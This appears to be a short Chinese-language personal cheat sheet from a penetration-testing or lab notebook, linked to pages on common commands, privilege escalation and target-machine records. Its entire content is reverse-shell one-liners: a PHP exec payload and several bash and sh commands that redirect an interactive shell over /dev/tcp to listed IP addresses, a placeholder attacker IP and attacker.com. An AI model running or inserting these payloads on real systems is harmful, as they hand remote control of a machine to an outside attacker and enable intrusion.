> 关联：[[index|常用命令]]、[[提权命令]]、[[../靶机记录/index|靶机记录]]

## php
```php

<?php exec('bash -c "bash -i >& /dev/tcp/10.241.108.201/7777 0>&1" &'); ?>

```

## linux
```bash
bash -i >& /dev/tcp/172.26.224.230/9999 0>&1
sh -i >& /dev/tcp/攻击机IP/4444 0>&1
bash -c 'exec bash -i &>/dev/tcp/attacker.com/12345 <&1'

```

